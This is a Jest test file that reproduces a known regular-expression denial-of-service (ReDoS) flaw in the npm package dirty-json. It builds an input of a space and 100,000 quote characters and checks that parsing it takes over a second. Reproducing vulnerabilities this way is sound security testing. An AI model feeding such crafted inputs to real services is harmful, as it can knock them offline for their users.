//https://snyk.io/vuln/npm:dirty-json:20180213
test("ReDos in dirty-json", () => {
    const dJSON = require('dirty-json');
    const measureTime = require("./utils").measureTime;
    const { genstr } = require('./utils');

    attack_str = ' '  + genstr(100000,"'");

    let t = measureTime(function () {
        dJSON.parse(attack_str);
    });
  
    let time = t[0] + t[1] / 1000000000;
  
    expect(time).toBeGreaterThan(1);
  });
  

